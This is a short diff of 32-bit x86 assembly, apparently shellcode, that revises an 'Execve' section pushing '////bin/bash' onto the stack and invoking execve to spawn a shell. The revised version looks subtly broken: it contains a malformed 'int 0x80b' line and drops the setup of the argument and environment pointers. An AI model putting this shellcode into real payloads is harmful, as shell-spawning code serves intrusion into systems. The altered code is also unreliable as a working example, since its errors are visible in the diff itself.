@@ -101,17 +101,13 @@ loop:
 	
 	;;;;;Execve;;;;;
 	
-	xor eax ,eax	
-	push eax
-
-	push 0x68736162
-	push 0x2f6e6962
-	push 0x2f2f2f2f
-		
-	mov ebx, esp
-	push eax
-	mov edx, esp
-	push ebx
-	mov ecx, esp
-	mov al, 0xb
+	xor eax ,eax		   	 ; zero out eax
+	push eax		         ; NULL
+	push 0x68736162	    		 ; “hsab”
+	push 0x2f6e6962	   		 ; “/nib”
+	push 0x2f2f2f2f		 	 ; “////”	
+	mov ebx, esp		    	 ; point ebx to stack
+	mov ecx, eax		    	 ; NULL
+	mov al, 0xb		     	 ; execve
+	int 0x80b
 	int 0x80
